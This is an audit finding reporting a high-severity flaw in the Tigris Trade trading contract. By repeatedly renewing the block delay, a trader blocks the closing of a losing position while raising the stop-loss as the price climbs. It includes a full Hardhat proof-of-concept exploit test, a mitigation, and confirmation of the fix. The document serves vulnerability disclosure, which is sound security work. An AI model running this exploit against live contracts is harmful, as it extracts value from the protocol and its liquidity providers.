[H-02] Riskless trades due to delay check
Submitted byBobface
Trading.limitClose()uses_checkDelay(). This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.
Detailed description
A malicious trader can exploit theTradingcontract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.
The exploit is based on three principles:
The stop-loss of a position can be updated without any delay checks, due to_checkDelay()not being called inupdateTpSl()Positions can only be closed by MEV bots or other third parties after the block delay has been passed due tolimitClosecalling_checkDelay()The block delay can be continuously renewed for a negligible cost
Based on these three principles, the following method can be used to perform riskless trades:Assuming a current market price of 1,000 DAI, begin by opening a long limit order throughinitiateLimitOrder()at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order throughexecuteLimitOrder.
After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would calllimitClose. However, we can prevent them from doing so by continuously callingaddToPositionwith 1 wei when the block delay comes close to running out[1], which will renew the delay and thus stopslimitClosefrom being called.
While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:
If the price goesdown, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated throughliquidatePosition(). If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.If the price goesup, the trader callsupdateTpSl()to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he callsupdateTpSl()with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to_checkDelay().
The trader keeps callingupdateTpSl()when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and callslimitClose()to close the order at the peak stop-loss.
Notes[1]: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls toaddToPositionafter every few transactions on the chain. However,block.number, which is used by the contract, actually returns the L1 block number and not the L2 block number.
Recommended Mitigation Steps
The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking inlimitClose()should be modified to also consider whether the position is below the stop-loss.
Proof of Concept
Insert the following code as test intotest/07.Trading.jsand run it withnpx hardhat test test/07.Trading.js:
describe("PoC",function() {it.only("PoC",asyncfunction() {// Setup token balances and approvalsconstmockDAI=awaitethers.getContractAt("MockERC20",MockDAI.address)awaitmockDAI.connect(owner).transfer(user.address,parseEther("10000"))awaitmockDAI.connect(owner).transfer(stablevault.address,parseEther("100000"))awaitmockDAI.connect(user).approve(trading.address,parseEther("10000"))constdaiAtBeginning=awaitmockDAI.balanceOf(user.address)constpermitData= ["0","0","0","0x0000000000000000000000000000000000000000000000000000000000000000","0x0000000000000000000000000000000000000000000000000000000000000000",false]// Setup block delay to 5 blocksconstblockDelay=5;awaittrading.connect(owner).setBlockDelay(blockDelay)// ============================================================== //// =================== Create the limit order =================== //// ============================================================== //consttradeInfo= [parseEther("9000"),// margin amountMockDAI.address,// margin assetStableVault.address,// stable vaultparseEther("2"),// leverage0,// asset idtrue,// direction (long)parseEther("0"),// take profit priceparseEther("1000"),// stop loss priceethers.constants.HashZero// referral];// Create the orderawaittrading.connect(user).initiateLimitOrder(tradeInfo,// trade info1,// order type (limit)parseEther("1000"),// pricepermitData,// permituser.address// trader)// ============================================================== //// =================== Execute the limit order ================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay;n++) {awaitnetwork.provider.send("evm_mine")}// Create the price data (the price hasn't changed)letpriceData= [node.address,// provider0,// asset idparseEther("1000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price dataletmessage=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));letsig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Execute the limit orderawaittrading.connect(user).executeLimitOrder(1,priceData,sig);// ============================================================== //// ================== Block bots from closing =================== //// ============================================================== //for(leti=0;i<5;i++) {/*This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.We constantly add 1 wei to the position when the delay is close to running out.This won't change anything about our position, but it will reset the delay timer,stopping bots from calling `limitClose()`.This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.And if the price rises, we can push the stop loss higher to keep profits.The loop runs five times just to demonstrate. In reality, this could be done as long as needed.*/// Blocks advanced to one block before the delay would passawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay-1;n++) {awaitnetwork.provider.send("evm_mine")}// ============================================================== //// =========== Add 1 wei to position (price is down)  =========== //// ============================================================== //// Increase delay by calling addToPosition with 1 wei// Create the price datapriceData= [node.address,// provider0,// asset idparseEther("900"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price data -message=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));sig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Add to positionawaittrading.connect(user).addToPosition(1,"1",priceData,sig,stablevault.address,MockDAI.address,permitData,user.address,)// ============================================================== //// ====================== Bots cannot close ===================== //// ============================================================== //// Bots cannot close the position even if the price is down below the stop lossawaitexpect(trading.connect(user).limitClose(1,// idfalse,// take profitpriceData,// price datasig,// signature)).to.be.revertedWith("0")// checkDelay// They can also not liquidate the position because the price is not down enough// If the price falls close to the liquidation zone, we can add more margin or simply close// the position, netting us the stop-loss price.awaitexpect(trading.connect(user).liquidatePosition(1,// idpriceData,// price datasig,// signature)).to.be.reverted// ============================================================== //// =============== Increase SL when price is up  ================ //// ============================================================== //// Sign the price data (price has 5x'ed from initial price)priceData= [node.address,// provider0,// asset idparseEther("5000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]message=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));sig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Update stop loss right at the current priceawaittrading.connect(user).updateTpSl(false,// type (sl)1,// idparseEther("5000"),// sl pricepriceData,// price datasig,// signatureuser.address,// trader)}// ============================================================== //// ======================== Close order  ======================== //// ============================================================== //// When we are happy with the profit, we stop increasing the delay and close the position// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])for(letn=0;n<blockDelay;n++) {awaitnetwork.provider.send("evm_mine")}// Close orderawaittrading.connect(user).limitClose(1,// idfalse,// take profitpriceData,// price datasig,// signature)// Withdraw to DAIconstamount=awaitstabletoken.balanceOf(user.address)awaitstablevault.connect(user).withdraw(MockDAI.address,amount)// Print resultsconstdaiAtEnd=awaitmockDAI.balanceOf(user.address)consttenPow18="1000000000000000000"constdiff= (daiAtEnd-daiAtBeginning).toString() /tenPow18console.log(`Profit:${diff}DAI`)})})
GainsGoblin (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.Because of the broken invariants, and the value extraction shown, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125